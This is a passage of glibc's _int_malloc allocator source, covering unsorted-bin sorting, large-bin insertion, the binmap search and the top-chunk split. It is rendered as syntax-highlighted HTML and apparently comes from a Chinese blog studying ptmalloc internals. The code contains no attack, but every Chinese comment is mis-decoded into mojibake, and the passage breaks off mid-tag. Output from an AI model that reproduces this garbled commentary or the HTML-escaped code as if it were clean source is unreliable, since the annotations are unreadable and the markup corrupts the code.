<span class="hljs-comment">/* remove from unsorted list */</span><br>            <span class="hljs-comment">// å°†è¯¥ chunk ä» unsorted list ç§»é™¤</span><br>            unsorted_chunks (av)-&gt;bk = bck;<br>            bck-&gt;fd = unsorted_chunks (av);<br><br>            <span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br>            <span class="hljs-comment">// æ°å¥½å®Œå…¨åŒ¹é…</span><br>            <span class="hljs-keyword">if</span> (size == nb) &#123;<br>                <span class="hljs-comment">// è®¾ç«‹ä¸‹ä¸€ä¸ª chunk çš„ prev_inuse ä½</span><br>                set_inuse_bit_at_offset (victim, size);<br>                <span class="hljs-comment">// è®¾ç«‹ non_main_arena ä½</span><br>                <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                    set_non_main_arena (victim);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>                    <span class="hljs-comment">/* Fill cache first, return to user only if cache fills.</span><br><span class="hljs-comment">                   We may return one of these chunks later.  */</span><br>                    <span class="hljs-comment">// tcache_nb å­˜åœ¨</span><br>                    <span class="hljs-comment">// å¯¹åº”çš„ tcache_bin æœªæ»¡</span><br>                    <span class="hljs-keyword">if</span> (tcache_nb<br>                    &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>                  &#123;<br>                    <span class="hljs-comment">// æŠŠè¯¥å— åŠ å…¥ tcache bin ä¸­</span><br>                    tcache_put (victim, tc_idx);<br>                    <span class="hljs-comment">// è®¾ç«‹è¿”å›æ ‡å¿—</span><br>                    return_cached = <span class="hljs-number">1</span>;<br>                    <span class="hljs-keyword">continue</span>;<br>                  &#125;<br>                    <span class="hljs-comment">// ä¸æ»¡è¶³ tcache å‚¨å­˜çš„æƒ…å†µ</span><br>                    <span class="hljs-keyword">else</span><br>                  &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>                <span class="hljs-comment">// ç›´æ¥è¿”å›</span><br>                check_malloced_chunk (av, victim, nb);<br>                <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>                alloc_perturb(p, bytes);<br>                <span class="hljs-keyword">return</span> p;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>                &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>            &#125;<br><br>            <span class="hljs-comment">/* place chunk in bin */</span><br><br>            <span class="hljs-keyword">if</span> (in_smallbin_range (size)) &#123;<br>                <span class="hljs-comment">// æ‹¿åˆ° small_bin çš„ç´¢å¼•</span><br>                victim_index = smallbin_index (size);<br>                <span class="hljs-comment">// æ‹¿åˆ°é“¾è¡¨å¤´</span><br>                bck = bin_at (av, victim_index);<br>                <span class="hljs-comment">// æ‹¿åˆ° ç¬¬ä¸€ä¸ªå…ƒç´ </span><br>                fwd = bck-&gt;fd;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// æ‹¿åˆ° large_bin çš„ç´¢å¼•</span><br>                victim_index = largebin_index (size);<br>                <span class="hljs-comment">// æ‹¿åˆ°é“¾è¡¨å¤´</span><br>                bck = bin_at (av, victim_index);<br>                <span class="hljs-comment">// æ‹¿åˆ° ç¬¬ä¸€ä¸ªå…ƒç´ </span><br>                fwd = bck-&gt;fd;<br><br>                <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>                <span class="hljs-comment">// large bin ä¸­æœ‰ç©ºé—² chunkå­˜åœ¨</span><br>                <span class="hljs-keyword">if</span> (fwd != bck) &#123;<br>                    <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                    <span class="hljs-comment">//</span><br>                    size |= PREV_INUSE;<br>                    <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                    assert(chunk_main_arena (bck-&gt;bk));<br><br>                    <span class="hljs-comment">// large binä¸­çš„chunkæ˜¯æŒ‰ä»å¤§åˆ°å°æ’åˆ—çš„</span><br>                    <span class="hljs-comment">// bck-&gt;bk å½“å‰é“¾è¡¨ä¸­æœ€å°çš„</span><br>                    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size)<br>                        &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (bck-&gt;bk)) &#123;<br>                        <span class="hljs-comment">// fwd = é“¾è¡¨å¤´</span><br>                        <span class="hljs-comment">// bk = å½“å‰é“¾è¡¨æœ€å°çš„é‚£ä¸ªchunk</span><br>                        fwd = bck;<br>                        bck = bck-&gt;bk;<br>                        <span class="hljs-comment">// fd_nextsize = é“¾è¡¨ä¸­é™¤å¤´å¤–çš„ç¬¬ä¸€ä¸ªå…ƒç´ </span><br>                        victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                        <span class="hljs-comment">// bk_nextsize = é“¾è¡¨ä¸­é™¤å¤´å¤–çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„ bk_nextsize</span><br>                        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                        <span class="hljs-comment">// é“¾è¡¨ä¸­é™¤å¤´å¤–çš„ç¬¬ä¸€ä¸ªå…ƒç´  çš„ bk_nextsize = victim</span><br>                        <span class="hljs-comment">// å®ŒæˆåŒé“¾è¡¨çš„è¿æ¥</span><br>                        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        assert(chunk_main_arena (fwd));<br><br>                        <span class="hljs-comment">// æ ¹æ® fd_nextsize è¿›è¡Œéå†ï¼Œç›´åˆ°æ‰¾åˆ°åº”è¯¥æ’å…¥çš„ä½ç½®</span><br>                        <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; chunksize_nomask (fwd)) &#123;<br>                            fwd = fwd-&gt;fd_nextsize;<br>                            assert(chunk_main_arena (fwd));<br>                        &#125;<br>                        <span class="hljs-comment">//  å¦‚æœä» large bin é“¾è¡¨ä¸­æ‰¾åˆ°äº†ä¸å½“å‰ chunk å¤§å°ç›¸åŒçš„ chunk</span><br>                        <span class="hljs-comment">//</span><br>                        <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size<br>                            == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (fwd))<br>                            <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                            fwd = fwd-&gt;fd;<br>                        <span class="hljs-comment">// å¦‚æœä» large bin é“¾è¡¨ä¸­æ²¡æœ‰æ‰¾åˆ°ä¸å½“å‰ chunk å¤§å°ç›¸åŒçš„ chunk</span><br>                        <span class="hljs-keyword">else</span> &#123;<br>                            <span class="hljs-comment">// å°† victim æ’å…¥å…¶ä¸­å¹¶å¸¦æœ‰ size åŸŸ</span><br>                            victim-&gt;fd_nextsize = fwd;<br>                            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                            fwd-&gt;bk_nextsize = victim;<br>                            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        &#125;<br>                        <span class="hljs-comment">// æ¥å…¥åŒé“¾è¡¨ä¸­</span><br>                        bck = fwd-&gt;bk;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-comment">// ç›¸åº”çš„ large bin æ²¡æœ‰å€¼</span><br>                <span class="hljs-keyword">else</span><br>                    <span class="hljs-comment">// ç›´æ¥æ’å…¥</span><br>                    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>            &#125;<br>            <span class="hljs-comment">// #define mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span><br><br>            mark_bin (av, victim_index);<br>            <span class="hljs-comment">// å°† victim ç§»åŠ¨è‡³ fd ä¸ bk çš„åŒé“¾è¡¨ä¸­</span><br>            victim-&gt;bk = bck;<br>            victim-&gt;fd = fwd;<br>            fwd-&gt;bk = victim;<br>            bck-&gt;fd = victim;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>            <span class="hljs-comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span><br><span class="hljs-comment">           filling the cache, return one of the cached ones.  */</span><br>            ++tcache_unsorted_count;<br>            <span class="hljs-comment">// æ»¡è¶³æ¡ä»¶</span><br>            <span class="hljs-keyword">if</span> (return_cached<br>            &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="hljs-number">0</span><br>            &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)<br>          &#123;<br>            <span class="hljs-comment">// è¿”å›ä¹‹å‰å­˜å…¥çš„ tcache</span><br>            <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>          &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>            <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>        <span class="hljs-comment">/* If all the small chunks we found ended up cached, return one now.  */</span><br>        <span class="hljs-comment">// å¦‚æœä¸Šé¢æ²¡æœ‰å–å‡º</span><br>        <span class="hljs-keyword">if</span> (return_cached)<br>      &#123;<br>        <span class="hljs-comment">// è¿”å›ä¹‹å‰å­˜å…¥çš„ tcache</span><br>        <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>      &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">           If a large request, scan through the chunks of current bin in</span><br><span class="hljs-comment">           sorted order to find smallest that fits.  Use the skip list for this.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">// åœ¨ large bin ä¸­æŸ¥æ‰¾</span><br>        <span class="hljs-keyword">if</span> (!in_smallbin_range (nb)) &#123;<br>            <span class="hljs-comment">// åœ¨ arena æ‰¾åˆ°å¯¹åº”çš„ä½ç½®</span><br>            bin = bin_at (av, idx);<br><br>            <span class="hljs-comment">/* skip scan if empty or largest chunk is too small */</span><br>            <span class="hljs-comment">// bin ä¸­æœ‰å€¼</span><br>            <span class="hljs-comment">// ä¸”è¯¥ chunk çš„ size å¤§äº nb</span><br>            <span class="hljs-keyword">if</span> ((victim = first (bin)) != bin<br>                &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (victim)<br>                   &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb)) &#123;<br>                <span class="hljs-comment">// ä»æœ€å°çš„é‚£ä¸ª chunk å¼€å§‹</span><br>                victim = victim-&gt;bk_nextsize;<br>                <span class="hljs-comment">// ä»å°åˆ°å¤§éå†ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ª size æ¯”è¯·æ±‚çš„ nb å¤§äºæˆ–ç­‰äºçš„</span><br>                <span class="hljs-keyword">while</span> (((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size = chunksize (victim)) &lt;<br>                        (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb)))<br>                    victim = victim-&gt;bk_nextsize;<br><br>                <span class="hljs-comment">/* Avoid removing the first entry for a size so that the skip</span><br><span class="hljs-comment">                   list does not have to be rerouted.  */</span><br>                <span class="hljs-comment">// å¦‚æœ victim ä¸æ˜¯ bin çš„æœ€åä¸€ä¸ª chunk</span><br>                <span class="hljs-comment">// ä¸” victim ä¸æ˜¯ skip list</span><br>                <span class="hljs-keyword">if</span> (victim != last (bin)<br>                    &amp;&amp; chunksize_nomask (victim)<br>                       == chunksize_nomask (victim-&gt;fd))<br>                    <span class="hljs-comment">// æ‹¿åˆ°çš„ victim æ˜¯ æ²¡æœ‰ next_size åŸŸçš„é‚£ä¸ª</span><br>                    victim = victim-&gt;fd;<br><br>                <span class="hljs-comment">// åˆ‡å‰²å‰å‡†å¤‡</span><br>                remainder_size = size - nb;<br>                <span class="hljs-comment">// å–æ¶ˆé“¾æ¥</span><br>                unlink (av, victim, bck, fwd);<br><br>                <span class="hljs-comment">/* Exhaust */</span><br>                <span class="hljs-comment">// å¦‚æœåˆ‡å‰²åçš„å¤§å°ä¸è¶³ä»¥ä½œä¸ºä¸€ä¸ª chunk ï¼Œé‚£ä¹ˆå°±ä¸åˆ†å‰²ç›´æ¥å°†å…¶æ ‡å¿—ä½è®¾ä¸º inuse</span><br>                <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>                &#123;<br>                    <span class="hljs-comment">// è®¾ç½®ä¸‹ä¸€ä¸ª chunk çš„ prev_inuse ä½</span><br>                    set_inuse_bit_at_offset (victim, size);<br>                    <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                        set_non_main_arena (victim);<br>                &#125;<br>                <span class="hljs-comment">/* Split */</span><br>                <span class="hljs-comment">// åˆ‡å‰²</span><br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    remainder = chunk_at_offset (victim, nb);<br>                    <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                       have to perform a complete insert here.  */</span><br>                    <span class="hljs-comment">// å°†åˆ‡å‰²åçš„ chunk æ”¾å…¥ unsorted bin ä¸­</span><br>                    <span class="hljs-comment">// è®°å½• remainder</span><br>                    bck = unsorted_chunks (av);<br>                    fwd = bck-&gt;fd;<br>                    <span class="hljs-keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))<br>                        malloc_printerr(<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks&quot;</span>);<br>                    remainder-&gt;bk = bck;<br>                    remainder-&gt;fd = fwd;<br>                    bck-&gt;fd = remainder;<br>                    fwd-&gt;bk = remainder;<br>                    <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size)) &#123;<br>                        remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                        remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                    &#125;<br>                    set_head (victim, nb | PREV_INUSE |<br>                                      (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                    set_head (remainder, remainder_size | PREV_INUSE);<br>                    set_foot (remainder, remainder_size);<br>                &#125;<br>                check_malloced_chunk (av, victim, nb);<br>                <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>                alloc_perturb(p, bytes);<br>                <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">           Search for a chunk by scanning bins, starting with next largest</span><br><span class="hljs-comment">           bin. This search is strictly by best-fit; i.e., the smallest</span><br><span class="hljs-comment">           (with ties going to approximately the least recently used) chunk</span><br><span class="hljs-comment">           that fits is selected.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">           The bitmap avoids needing to check that most blocks are nonempty.</span><br><span class="hljs-comment">           The particular case of skipping all bins during warm-up phases</span><br><span class="hljs-comment">           when no chunks have been returned yet is faster than it might look.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">// å¦‚æœé€šè¿‡ä¸Šé¢çš„æ–¹å¼ä»æœ€åˆé€‚çš„ small bin æˆ– large bin ä¸­éƒ½æ²¡æœ‰åˆ†é…åˆ°éœ€è¦çš„ chunkï¼Œ</span><br>        <span class="hljs-comment">// åˆ™ æŸ¥çœ‹æ¯”å½“å‰ bin çš„ index å¤§çš„ small bin æˆ– large bin æ˜¯å¦æœ‰ç©ºé—² chunk å¯åˆ©ç”¨æ¥åˆ†é…æ‰€éœ€çš„ chunkã€‚</span><br>        <span class="hljs-comment">// è·å–ä¸‹ä¸€ä¸ªç›¸é‚» bin çš„ç©ºé—² chunk é“¾è¡¨</span><br>        ++idx;<br>        bin = bin_at (av, idx);<br>        <span class="hljs-comment">// binmap å­—æ®µæ˜¯ä¸€ä¸ª int æ•°ç»„ï¼Œptmalloc ç”¨ä¸€ä¸ª bit æ¥æ ‡è¯†è¯¥ bit å¯¹åº”çš„ bin ä¸­æ˜¯å¦åŒ…å«ç©ºé—² chunkã€‚</span><br>        <span class="hljs-comment">// Binmap æŒ‰ block ç®¡ç†ï¼Œæ¯ä¸ª block ä¸ºä¸€ä¸ª intï¼Œå…± 32 ä¸ª bitï¼Œå¯ä»¥è¡¨ç¤º 32 ä¸ª bin ä¸­æ˜¯å¦æœ‰ç©ºé—² chunk å­˜åœ¨ã€‚</span><br>        <span class="hljs-comment">// ä½¿ç”¨ binmap å¯ä»¥åŠ å¿«æŸ¥æ‰¾ bin æ˜¯å¦åŒ…å«ç©ºé—² chunkã€‚</span><br>        <span class="hljs-comment">// è¿™é‡ŒåªæŸ¥è¯¢æ¯”æ‰€éœ€ chunk å¤§çš„ bin ä¸­æ˜¯å¦æœ‰ç©ºé—² chunk å¯ç”¨ã€‚</span><br>        block = idx2block (idx);<br>        <span class="hljs-built_in">map</span> = av-&gt;binmap[block];<br>        <span class="hljs-comment">// 	Idx2bit()å®å°† idx æŒ‡å®šçš„ä½è®¾ç½®ä¸º 1ï¼Œå…¶å®ƒä½æ¸…é›¶ï¼Œ</span><br>        <span class="hljs-comment">// 	map è¡¨ç¤ºä¸€ä¸ª block(unsigned int) å€¼ï¼Œå¦‚æœbit å¤§äº mapï¼Œ</span><br>        <span class="hljs-comment">// 	æ„å‘³ç€æ¯”bitå¯¹åº”çš„binçš„sizeå¤§çš„binä¸­æ— ç©ºé—²chunkï¼Œ</span><br>        <span class="hljs-comment">// 	å¦‚æœ map ä¸º 0ï¼Œè¯¥ block æ‰€å¯¹åº”çš„æ‰€æœ‰ bins ä¸­éƒ½æ²¡æœ‰ç©ºé—² chunkï¼Œ</span><br>        <span class="hljs-comment">// 	äºæ˜¯éå† binmap çš„ä¸‹ä¸€ä¸ª blockï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªä¸ä¸º 0 çš„ block</span><br>        <span class="hljs-comment">// 	æˆ–è€…éå†å®Œæ‰€æœ‰çš„ blockã€‚</span><br>        <span class="hljs-comment">// 	é€€å‡ºå¾ªç¯éå†åï¼Œè®¾ç½® bin æŒ‡å‘ block çš„ç¬¬ä¸€ä¸ª bit å¯¹åº”çš„ binï¼Œ</span><br>        <span class="hljs-comment">// 	å¹¶å°† bit ç½®ä¸º 1ï¼Œè¡¨ç¤ºè¯¥ block ä¸­ bit 1 å¯¹åº”çš„ binï¼Œ</span><br>        <span class="hljs-comment">// 	è¿™ä¸ª bin ä¸­å¦‚æœæœ‰ç©ºé—² chunkï¼Œè¯¥ chunk çš„å¤§å°ä¸€å®šæ»¡è¶³è¦æ±‚ã€‚</span><br>        bit = idx2bit (idx);<br><br>        <span class="hljs-keyword">for</span> (;;) &#123;<br>            <span class="hljs-comment">//     	å¦‚æœbit å¤§äº mapï¼Œæ„å‘³ç€æ¯”è¯¥bitå¯¹åº”çš„binçš„sizeå¤§çš„binä¸­æ— ç©ºé—²chunkï¼Œå¦‚æœ map ä¸º 0ï¼Œ</span><br>            <span class="hljs-comment">//      è¯¥ block æ‰€å¯¹åº”çš„æ‰€æœ‰ bins ä¸­éƒ½æ²¡æœ‰ç©ºé—² chunk ã€‚æ¥ç€åœ¨ä¸‹ä¸€ä¸ªblockä¸­å¯»æ‰¾</span><br>            <span class="hljs-comment">/* Skip rest of block if there are no more set bits in this block.  */</span><br>            <span class="hljs-keyword">if</span> (bit &gt; <span class="hljs-built_in">map</span> || bit == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">do</span> &#123;<br>                    <span class="hljs-keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="hljs-comment">/* out of bins */</span><br>                        <span class="hljs-comment">// å¦‚æœblockè¶…è¿‡äº†èŒƒå›´ï¼Œè¯´æ˜æ¯”æ‰€éœ€chunkå¤§çš„binä¸­æ²¡æœ‰chunkï¼Œç›´æ¥ä½¿ç”¨top_chunk</span><br>                        <span class="hljs-keyword">goto</span> use_top;<br>                <span class="hljs-comment">// å¦‚æœblockä¸º0,è¿™è¡¨æ˜blockä¸­çš„æ‰€æœ‰bitæ‰€å¯¹åº”çš„binæ²¡æœ‰ç©ºé—²chunk</span><br>                &#125; <span class="hljs-keyword">while</span> ((<span class="hljs-built_in">map</span> = av-&gt;binmap[block]) == <span class="hljs-number">0</span>);<br><br>                bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));<br>                bit = <span class="hljs-number">1</span>;<br>            &#125;<br><br>            <span class="hljs-comment">/* Advance to bin with set bit. There must be one. */</span><br>            <span class="hljs-comment">// åœ¨ä¸€ä¸ªblockéå†å¯¹åº”çš„ binï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ª bit ä¸ä¸º 0 é€€å‡ºéå†ï¼Œåˆ™è¯¥ bit å¯¹äºçš„ bin ä¸­æœ‰ç©ºé—² chunk å­˜åœ¨ã€‚</span><br>            <span class="hljs-keyword">while</span> ((bit &amp; <span class="hljs-built_in">map</span>) == <span class="hljs-number">0</span>) &#123;<br>                bin = next_bin (bin);<br>                bit &lt;&lt;= <span class="hljs-number">1</span>;<br>                assert(bit != <span class="hljs-number">0</span>);<br>            &#125;<br><br>            <span class="hljs-comment">/* Inspect the bin. It is likely to be non-empty */</span><br>            <span class="hljs-comment">// è·å–binå°¾éƒ¨çš„chunk</span><br>            victim = last (bin);<br><br>            <span class="hljs-comment">/*  If a false alarm (empty bin), clear the bit. */</span><br>            <span class="hljs-comment">//         å¦‚æœ victim ä¸ bin é“¾è¡¨å¤´æŒ‡é’ˆç›¸åŒï¼Œè¡¨ç¤ºè¯¥ bin ä¸­æ²¡æœ‰ç©ºé—² chunkï¼Œbinmap ä¸­çš„ç›¸åº”ä½</span><br>            <span class="hljs-comment">//        è®¾ç½®ä¸å‡†ç¡®ï¼Œå°† binmap çš„ç›¸åº” bit ä½æ¸…é›¶ï¼Œè·å–å½“å‰ bin ä¸‹ä¸€ä¸ª binï¼Œå°† bit ç§»åˆ°ä¸‹ä¸€ä¸ª</span><br>            <span class="hljs-comment">//        bit ä½ï¼Œå³ä¹˜ä»¥ 2ã€‚</span><br>            <span class="hljs-keyword">if</span> (victim == bin) &#123;<br>                av-&gt;binmap[block] = <span class="hljs-built_in">map</span> &amp;= ~bit; <span class="hljs-comment">/* Write through */</span><br>                bin = next_bin (bin);<br>                bit &lt;&lt;= <span class="hljs-number">1</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// å½“å‰ bin ä¸­çš„æœ€åä¸€ä¸ª chunk æ»¡è¶³è¦æ±‚ï¼Œè·å–è¯¥ chunk çš„å¤§å°ï¼Œè®¡ç®—åˆ‡åˆ†å‡ºæ‰€éœ€ chunk</span><br>                <span class="hljs-comment">// åå‰©ä½™éƒ¨åˆ†çš„å¤§å°ï¼Œç„¶åå°† victim ä» bin çš„é“¾è¡¨ä¸­å–å‡ºã€‚</span><br>                <span class="hljs-comment">/*  We know the first chunk in this bin is big enough to use. */</span><br>                size = chunksize (victim);<br>                assert((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb));<br><br>                remainder_size = size - nb;<br><br>                <span class="hljs-comment">/* unlink */</span><br>                unlink (av, victim, bck, fwd);<br><br>                <span class="hljs-comment">/* Exhaust */</span><br>                <span class="hljs-comment">//         å¦‚æœå‰©ä½™éƒ¨åˆ†çš„å¤§å°å°äº MINSIZEï¼Œå°†æ•´ä¸ª chunk åˆ†é…ç»™åº”ç”¨å±‚ï¼Œè®¾ç½® victim çš„çŠ¶æ€ä¸º</span><br>                <span class="hljs-comment">//        inuseï¼Œå¦‚æœå½“å‰åˆ†é…åŒºä¸ºéä¸»åˆ†é…åŒºï¼Œè®¾ç½® victim çš„éä¸»åˆ†é…åŒºæ ‡å¿—ä½ã€‚</span><br>                <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>                &#123;<br>                    set_inuse_bit_at_offset (victim, size);<br>                    <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                        set_non_main_arena (victim);<br>                &#125;<br><br>                <span class="hljs-comment">/* Split */</span><br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-comment">// å¦‚æœå‰©ä½™çš„å¤§å°å¯ä»¥ä½œä¸ºä¸€ä¸ªchunk</span><br>                    <span class="hljs-comment">// è·å¾—å‰©ä½™éƒ¨åˆ†çš„åœ°å€ï¼Œæ”¾å…¥unsorted binä¸­</span><br>                    remainder = chunk_at_offset (victim, nb);<br><br>                    <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                       have to perform a complete insert here.  */</span><br>                    bck = unsorted_chunks (av);<br>                    fwd = bck-&gt;fd;<br>                    <span class="hljs-comment">// æ£€æŸ¥unsorted bin ä¸­çš„é“¾è¡¨å¤´éƒ¨æ˜¯å¦åˆæ³•</span><br>                    <span class="hljs-keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))<br>                        malloc_printerr(<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>);<br>                    remainder-&gt;bk = bck;<br>                    remainder-&gt;fd = fwd;<br>                    bck-&gt;fd = remainder;<br>                    fwd-&gt;bk = remainder;<br><br>                    <span class="hljs-comment">/* advertise as last remainder */</span><br>                    <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>                        av-&gt;last_remainder = remainder;<br>                    <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size)) &#123;<br>                        remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                        remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                    &#125;<br>                    set_head (victim, nb | PREV_INUSE |<br>                                      (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                    set_head (remainder, remainder_size | PREV_INUSE);<br>                    set_foot (remainder, remainder_size);<br>                &#125;<br>                check_malloced_chunk (av, victim, nb);<br>                <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>                alloc_perturb(p, bytes);<br>                <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br><br>        use_top:<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">           If large enough, split off the chunk bordering the end of memory</span><br><span class="hljs-comment">           (held in av-&gt;top). Note that this is in accord with the best-fit</span><br><span class="hljs-comment">           search rule.  In effect, av-&gt;top is treated as larger (and thus</span><br><span class="hljs-comment">           less well fitting) than any other available chunk since it can</span><br><span class="hljs-comment">           be extended to be as large as necessary (up to system</span><br><span class="hljs-comment">           limitations).</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">           We require that av-&gt;top always exists (i.e., has size &gt;=</span><br><span class="hljs-comment">           MINSIZE) after initialization, so if it would otherwise be</span><br><span class="hljs-comment">           exhausted by current request, it is replenished. (The main</span><br><span class="hljs-comment">           reason for ensuring it exists is that we may need MINSIZE space</span><br><span class="hljs-comment">           to put in fenceposts in sysmalloc.)</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">// å¦‚æœä»æ‰€æœ‰çš„ bins ä¸­éƒ½æ²¡æœ‰è·å¾—æ‰€éœ€çš„ chunkï¼Œå¯èƒ½çš„æƒ…å†µä¸º bins ä¸­æ²¡æœ‰ç©ºé—² chunkï¼Œ</span><br>        <span class="hljs-comment">// æˆ–è€…æ‰€éœ€çš„ chunk å¤§å°å¾ˆå¤§ï¼Œä¸‹ä¸€æ­¥å°†å°è¯•ä» top chunk ä¸­åˆ†é…æ‰€éœ€ chunkã€‚</span><br>        victim = av-&gt;top;<br>        size = chunksize (victim);<br><br>        <span class="hljs-comment">// æœ top chunk æ»¡è¶³æˆ‘ä»¬è¦ç”³è¯·çš„ chunk å¤§å°è¦æ±‚</span><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>        &#123;<br>            <span class="hljs-comment">// åˆ‡å‰² top chunk</span><br>            remainder_size = size - nb;<br>            remainder = chunk_at_offset (victim, nb);<br>            av-&gt;top = remainder;<br>            set_head (victim, nb | PREV_INUSE |<br>                              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>            set_head (remainder, remainder_size | PREV_INUSE);<br><br>            check_malloced_chunk (av, victim, nb);<br>            <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>            alloc_perturb(p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>        &#125;<br><br>        <span class="hljs-comment">/* When we are using atomic ops to free fast chunks we can get</span><br><span class="hljs-comment">           here for all block sizes.  */</span><br>        <span class="hljs-comment">// å¦‚æœ top chunk ç©ºé—´ä¸å¤Ÿ</span><br>        <span class="hljs-comment">// ä¸” fastbin ä¸­æœ‰ç©ºé—² chunk</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (atomic_load_relaxed(&amp;av-&gt;have_fastchunks)) &#123;<br>            <span class="hljs-comment">// è§¦å‘ malloc_consolidate å‡½æ•°åˆå¹¶ fastbin çš„ chunk</span><br>            malloc_consolidate(av);<br>            <span class="hljs-comment">/* restore original bin index */</span><br>            <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>                idx = smallbin_index (nb);<br>            <span class="hljs-keyword">else</span><br>                idx = largebin_index (nb);<br>        &#125;<br><br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">               Otherwise, relay to handle system-dependent cases</span><br><span class="hljs-comment">             */</span><br>        <span 